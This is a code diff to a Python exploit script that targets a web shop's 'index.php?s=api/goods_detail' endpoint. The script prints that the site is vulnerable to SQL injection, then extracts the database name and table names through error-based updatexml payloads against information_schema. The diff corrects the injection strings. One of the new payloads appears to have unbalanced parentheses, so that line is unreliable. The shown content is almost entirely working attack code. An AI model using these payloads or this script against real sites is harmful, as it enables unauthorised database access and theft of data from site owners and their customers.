@@ -24,7 +24,7 @@ def sqli():
                         if "syntax" in r.text:
                             print("上诉地址存在SQL注入")
                             database_name = re.findall("General error: 1105 XPATH syntax error: '~(.+?)~'", r.text)
-                            sqli_path = "/index.php?s=api/goods_detail&goods_id=1 and updatexml(1,concat(0x7e,select table_name from information_schema.tables where table_schema='{0}',0x7e),1)".format(
+                            sqli_path = "/index.php?s=api/goods_detail&goods_id=1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='{0}' limit 0,1),0x7e),0x7e),1)".format(
                                 database_name[0])
                             sqli_url = "https://" + url[0] + sqli_path
                             print(sqli_url)
@@ -38,7 +38,7 @@ def sqli():
                                 if "syntax" in r.text:
                                     print("上诉地址存在SQL注入")
                                     database_name = re.findall("General error: 1105 XPATH syntax error: '~(.+?)~'", r.text)
-                                    sqli_path = "/index.php?s=api/goods_detail&goods_id=1 and updatexml(1,concat(0x7e,select table_name from information_schema.tables where table_schema='{0}',0x7e),1)".format(database_name[0])
+                                    sqli_path = "/index.php?s=api/goods_detail&goods_id=1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='{0}' limit 0,1),0x7e),1)".format(database_name[0])
                                     sqli_url = "https://" + url[0] + sqli_path
                                     print(sqli_url)
                                     # sqli = requests.get(url=url)
@@ -98,3 +98,4 @@ def upload():
 
 if __name__ == "__main__":
     sqli()
+    
